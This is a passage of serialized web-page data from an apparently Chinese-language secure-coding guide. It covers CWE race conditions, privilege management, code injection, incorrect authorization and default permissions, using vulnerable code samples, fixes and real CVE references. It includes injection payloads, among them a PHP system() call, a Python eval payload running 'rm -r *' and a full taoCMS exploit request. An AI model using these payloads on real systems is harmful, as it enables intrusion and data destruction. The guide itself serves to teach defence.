Condition')"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"数据竞争，某段代码需要对共享资源进行临时、独占访问，但存在一个时间窗口，在该时间窗口内共享资源可被同时运行的另一个代码片段修改。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"数据竞争违反了以下两个原则："}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"排他性：代码序列被赋予对共享资源的排他性访问权限，即在原始序列完成执行之前，其他代码序列不能修改共享资源的属性。"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"原子性：代码序列被视为一个单一的操作，即在执行期间不会被中断，也不会被其他代码序列中断。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"程序员可能会认为某些代码序列执行得太快，不会受到干扰代码序列的影响，但事实并非如此。例如，单个<code class=\"x-inline-highlight\">x++</code>语句在代码层可能看起来是原子的，但在指令层实际上是非原子的，因为它涉及读取<code class=\"x-inline-highlight\">x</code>的原始值、计算<code class=\"x-inline-highlight\">x+1</code>、最后将结果赋值给<code class=\"x-inline-highlight\">x</code>。"}}]]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"干扰代码序列可以是可信的或不可信的。受信任的干扰代码序列出现在产品内部，攻击者无法修改，只能间接调用。不受信任的干扰代码序列可由攻击者直接编写，通常在易受攻击产品的外部。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Perl"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$transfer_amount = GetTransferAmount();\n$balance = GetBalanceFromDatabase();\n\nif ($transfer_amount < 0)\n{\n    FatalError(\"Bad Transfer Amount\");\n}\n$newbalance = $balance - $transfer_amount;\nif (($balance - $transfer_amount) < 0)\n{\n    FatalError(\"Insufficient Funds\");\n}\nSendNewBalanceToDatabase($newbalance);\nNotifyUser(\"Transfer of $transfer_amount succeeded.\");\nNotifyUser(\"New balance: $newbalance\");\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$3a"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这个例子中<code class=\"x-inline-highlight\">GetBalanceFromDatabase()</code>和<code class=\"x-inline-highlight\">SendNewBalanceToDatabase()</code>可能会发生数据竞争。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"假设初始余额<code class=\"x-inline-highlight\">balance</code>是<code class=\"x-inline-highlight\">100.00</code>，一个攻击可以构造如下："}}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"3."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"攻击者调起两个程序，<code class=\"x-inline-highlight\">PROGRAM-1</code>和<code class=\"x-inline-highlight\">PROGRAM-2</code>，使用同一账户。"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"4."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">PROGRAM-1</code>请求转账<code class=\"x-inline-highlight\">80.00</code>，此时<code class=\"x-inline-highlight\">PROGRAM-1</code>计算出<code class=\"x-inline-highlight\">$newbalance</code>为<code class=\"x-inline-highlight\">20.00</code>。"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"5."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">PROGRAM-1</code>调用<code class=\"x-inline-highlight\">SendNewBalanceToDatabase(20.00)</code>，但是<span class=\"x-inline-strong\">受到了延迟</span>。"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"6."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">PROGRAM-2</code>请求转账<code class=\"x-inline-highlight\">1.00</code>，同理计算出<code class=\"x-inline-highlight\">$newbalance</code>为<code class=\"x-inline-highlight\">99.00</code>。"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"7."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">PROGRAM-2</code>调用<code class=\"x-inline-highlight\">SendNewBalanceToDatabase(99.00)</code>。"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"8."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">PROGRAM-1</code>调用的<code class=\"x-inline-highlight\">SendNewBalanceToDatabase(20.00)</code>提交到数据库。"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"9."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">PROGRAM-2</code>调用的<code class=\"x-inline-highlight\">SendNewBalanceToDatabase(99.00)</code>提交到数据库。"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"最后导致数据库记录的余额是错误的。"}}],["$","h4",null,{"className":"x-h3","children":"Example 2"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"void f(pthread_mutex_t *mutex)\n{\n    pthread_mutex_lock(mutex);\n\n    /* access shared resource */\n\n    pthread_mutex_unlock(mutex);\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">void</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">pthread_mutex_t</span> <span class=\"token operator\">*</span>mutex<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token function\">pthread_mutex_lock</span><span class=\"token punctuation\">(</span>mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* access shared resource */</span>\n\n    <span class=\"token function\">pthread_mutex_unlock</span><span class=\"token punctuation\">(</span>mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"上面的函数尝试获取锁，以便对共享资源执行操作。不过上述函数没有检查<code class=\"x-inline-highlight\">pthread_mutex_lock()</code>是否正常返回。如果因为一些原因导致<code class=\"x-inline-highlight\">pthread_mutex_lock()</code>失败，那么这个例子会导致数据竞争。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"正确的做法是："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"int f(pthread_mutex_t *mutex)\n{\n    int result;\n\n    result = pthread_mutex_lock(mutex);\n    if (0 != result)\n        return result;\n\n    /* access shared resource */\n\n    return pthread_mutex_unlock(mutex);\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$3b"}}]}]]}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2024-24254\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2024-24254</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code><code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/Drone-Lab/PX4-Autopilot/blob/report-can-not-pause-vulnerability/Multi-Threaded%20Race%20Condition%20bug%20found%20in%20PX4%20cause%20drone%20can%20not%20PAUSE.md\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/Drone-Lab/PX4-Autopilot/blob/report-can-not-pause-vulnerability/Multi-Threaded%20Race%20Condition%20bug%20found%20in%20PX4%20cause%20drone%20can%20not%20PAUSE.md</a>"}}]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/269.html","target":"_blank","rel":"noreferrer","children":"【C】CWE-269: Improper Privilege Management"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"权限管理不当，程序没有正确地管理用户的权限。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"def makeNewUserDir(username):\n    if invalidUsername(username):\n        #avoid CWE-22 and CWE-78\n        print('Usernames cannot contain invalid characters')\n        return False\n\n    try:\n        raisePrivileges()\n        os.mkdir('/home/' + username)\n        lowerPrivileges()\n    except OSError:\n        print('Unable to create new user directory for user:' + username)\n        return False\n\n    return True\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$3c"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"上述代码先提高权限以创建文件夹，然后立刻降回来。但如果<code class=\"x-inline-highlight\">os.mkdir()</code>发生了异常，就不会调用<code class=\"x-inline-highlight\">lowerPrivileges()</code>，这时程序会在提高的权限下运行，可能导致进一步被利用。"}}],["$","h4",null,{"className":"x-h3","children":"Example 2"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Java"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"public enum Roles\n{\n    ADMIN,OPERATOR,USER,GUEST\n}\n\npublic void resetPassword(User requestingUser, User user, String password)\n{\n    if (isAuthenticated(requestingUser))\n    {\n        switch (requestingUser.role)\n        {\n        case GUEST:\n            System.out.println(\"You are not authorized to perform this command\");\n            break;\n\n        case USER:\n            System.out.println(\"You are not authorized to perform this command\");\n            break;\n\n        default:\n            setPassword(user, password);\n            break;\n        }\n    }\n    else\n    {\n        System.out.println(\"You must be logged in to perform this command\");\n    }\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$3d"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这个系统定义了不同等级的用户，<code class=\"x-inline-highlight\">ADMIN</code>和<code class=\"x-inline-highlight\">OPERATOR</code>都可以重置密码。系统设计的初衷是想让<code class=\"x-inline-highlight\">OPERATOR</code>拥有稍弱于<code class=\"x-inline-highlight\">ADMIN</code>的权限；然而既然<code class=\"x-inline-highlight\">OPERATOR</code>可以修改密码，那么就可以通过重置<code class=\"x-inline-highlight\">ADMIN</code>账号的密码来控制一个管理员账号。此例的权限管理是有缺陷的。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2017-11747\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2017-11747</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://github.com/tinyproxy/tinyproxy/issues/106\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/tinyproxy/tinyproxy/issues/106</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/obnoxxx/tinyproxy/commit/fe4d29888306e62f3bbf964b3fdb8126ddbe8f6e\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/obnoxxx/tinyproxy/commit/fe4d29888306e62f3bbf964b3fdb8126ddbe8f6e</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"Tinyproxy 1.8.4及更早版本中的<code class=\"x-inline-highlight\">main.c</code>会在向非<code class=\"x-inline-highlight\">root</code>帐户下放权限后创建<code class=\"x-inline-highlight\">/run/tinyproxy/tinyproxy.pid</code>文件，这可能允许本地用户在<code class=\"x-inline-highlight\">root</code>脚本执行<code class=\"x-inline-highlight\">kill &#96;cat /run/tinyproxy/tinyproxy.pid&#96;</code>命令之前，利用访问该非<code class=\"x-inline-highlight\">root</code>帐户的权限来修改<code class=\"x-inline-highlight\">tinyproxy.pid</code>，从而杀死任意进程。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"/* Create pid file before we drop privileges */\nif (config.pidpath) {\n        if (pidfile_create (config.pidpath) < 0) {\n                fprintf (stderr, \"%s: Could not create PID file.\\n\",\n                         argv[0]);\n                exit (EX_OSERR);\n        }\n}\n\n/* Switch to a different user if we're running as root */\nif (geteuid () == 0)\n        change_user (argv[0]);\nelse\n        log_message (LOG_WARNING,\n                     \"Not running as root, so not changing UID/GID.\");\n/* Create log file after we drop privileges */\nif (setup_logging ()) {\n        exit (EX_SOFTWARE);\n}\n\n/* Create pid file after we drop privileges */\nif (config.pidpath) {\n        if (pidfile_create (config.pidpath) < 0) {\n                fprintf (stderr, \"%s: Could not create PID file.\\n\",\n                         argv[0]);\n                exit (EX_OSERR);\n        }\n}\n\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 24px, var(--bg-transparent-green) 24px 240px, transparent 240px, transparent 504px, var(--bg-transparent-red) 504px 720px, transparent 720px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$3e"}}]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/94.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-94: Improper Control of Generation of Code ('Code Injection')"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"当产品允许用户输入包含代码语法的内容时，攻击者有可能以改变产品预期控制流的方式编写代码。这种改变可能导致任意代码的执行。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$MessageFile = \"messages.out\";\nif ($_GET[\"action\"] == \"NewMessage\")\n{\n    $name = $_GET[\"name\"];\n    $message = $_GET[\"message\"];\n    $handle = fopen($MessageFile, \"a+\");\n    fwrite($handle, \"<b>$name</b> says '$message'<hr>\\n\");\n    fclose($handle);\n    echo \"Message Saved!<p>\\n\";\n}\nelse if ($_GET[\"action\"] == \"ViewMessages\")\n{\n    include($MessageFile);\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$3f"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这段代码尝试将用户消息写入消息文件并允许用户查看它们。开发者可能希望文件只包含数据，然而攻击者可以构造以下参数："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"name=h4x0r\nmessage=%3C?php%20system(%22/bin/ls%20-l%22);?%3E\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"name=h4x0r\nmessage=%3C?php%20system(%22/bin/ls%20-l%22);?%3E\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这会被解析成："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<?php system(\"/bin/ls -l\");?>"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/bin/ls -l\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这将导致用户查看它们的时候，PHP代码被解析执行。注意这种情况下，同样存在XSS漏洞风险。"}}],["$","h4",null,{"className":"x-h3","children":"Example 2"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"def main():\n    sum = 0\n    numbers = eval(input(\"Enter a space-separated list of numbers: \"))\n    for num in numbers:\n        sum = sum + num\n    print(f\"Sum of {numbers} = {sum}\")\nmain()\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$40"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">eval</code>函数会执行用户输入的代码，一个可以注入的载荷是<code class=\"x-inline-highlight\">__import__('subprocess').getoutput('rm -r *')</code>。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2023-1947\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2023-1947</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://gitee.com/misak7in/cve/blob/master/taocms.md\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://gitee.com/misak7in/cve/blob/master/taocms.md</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"taoCMS 3.0.2存在代码注入漏洞，发送请求："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"POST /admin/admin.php HTTP/1.1\nHost: www.taocms.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 161\nOrigin: http://www.taocms.com\nConnection: close\nReferer: http://www.taocms.com/admin/admin.php?action=category&ctrl=add\nCookie: PHPSESSID=3p2h8g38ejqf1402s5i384b7h0\nUpgrade-Insecure-Requests: 1\nX-Forwarded-For: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nX-Remote-Addr: 127.0.0.1\n\nname=%27%29%29%3Bphpinfo%28%29%3B%2F*&nickname=22&fid=&cattpl=&listtpl=&distpl=&intro=33&orders=&status=1&action=category&id=&ctrl=save&Submit=%E6%8F%90%E4%BA%A4\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"POST /admin/admin.php HTTP/1.1\nHost: www.taocms.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 161\nOrigin: http://www.taocms.com\nConnection: close\nReferer: http://www.taocms.com/admin/admin.php?action=category&amp;ctrl=add\nCookie: PHPSESSID=3p2h8g38ejqf1402s5i384b7h0\nUpgrade-Insecure-Requests: 1\nX-Forwarded-For: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nX-Remote-Addr: 127.0.0.1\n\nname=%27%29%29%3Bphpinfo%28%29%3B%2F*&amp;nickname=22&amp;fid=&amp;cattpl=&amp;listtpl=&amp;distpl=&amp;intro=33&amp;orders=&amp;status=1&amp;action=category&amp;id=&amp;ctrl=save&amp;Submit=%E6%8F%90%E4%BA%A4\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"请求的参数解析后是："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"name='));phpinfo();/*&nickname=..."}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"name='));phpinfo();/*&amp;nickname=..."}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"内容会被写入<code class=\"x-inline-highlight\">cat_array.inc</code>文件："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<?php\n$cats=array(\n0=>array(\n'name'=>'未分组',\n'status'=>0,\n'orders'=>0,\n'id'=>0),\n7=>array(\n'name'=>''));phpinfo();/*\n\n...*/\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$41"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"后面的内容被注释。文件在<code class=\"x-inline-highlight\">/wap/index.php</code>被引入，从而可以获取系统配置。"}}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/863.html","target":"_blank","rel":"noreferrer","children":"【C】CWE-863: Incorrect Authorization"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"错误的授权，没有正确验证用户是否有权访问资源。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$role = $_COOKIES['role'];\nif (!$role)\n{\n    $role = getRole('user');\n    if ($role)\n    {\n        // save the cookie to send out in future responses\n        setcookie(\"role\", $role, time() + 60 * 60 * 2);\n    }\n    else\n    {\n        ShowLoginScreen();\n        die(\"\\n\");\n    }\n}\nif ($role == 'Reader')\n{\n    DisplayMedicalHistory($_POST['patient_ID']);\n}\nelse\n{\n    die(\"You are not Authorized to view this record\\n\");\n}\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 24px, var(--bg-transparent-golden) 24px 48px, transparent 48px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$42"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"修改cookie即可绕过授权。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2024-22208\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2024-22208</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9hhf-xmcw-r3xg\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9hhf-xmcw-r3xg</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/thorsten/phpMyFAQ/commit/a34d94ab7b1be9256a9ef898f18ea6bfb63f6f1e\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/thorsten/phpMyFAQ/commit/a34d94ab7b1be9256a9ef898f18ea6bfb63f6f1e</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"phpMyFAQ v3.2.5前的<code class=\"x-inline-highlight\">Sharing FAQ</code>功能可以给其他邮箱分享讯息，前端只有<code class=\"x-inline-highlight\">5</code>个输入框（希望用户最多分享给<code class=\"x-inline-highlight\">5</code>个邮箱），然而后端并没有对数量做限制，攻击者可以构造请求发送大量邮件。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"部分补丁的内容："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$43"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 144px, var(--bg-transparent-red) 144px 168px, transparent 168px, transparent 240px, var(--bg-transparent-green) 240px 456px, transparent 456px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$44"}}]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/276.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-276: Incorrect Default Permissions"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"错误的默认权限。指软件系统、应用程序、文件或资源在创建时被分配了不适当的默认权限。这些默认权限可能过于宽松，允许未授权的用户或进程进行不必要或有害的访问和操作，从而导致潜在的安全漏洞。"}}],["$","h4",null,{"className":"x-h3","children":"Example 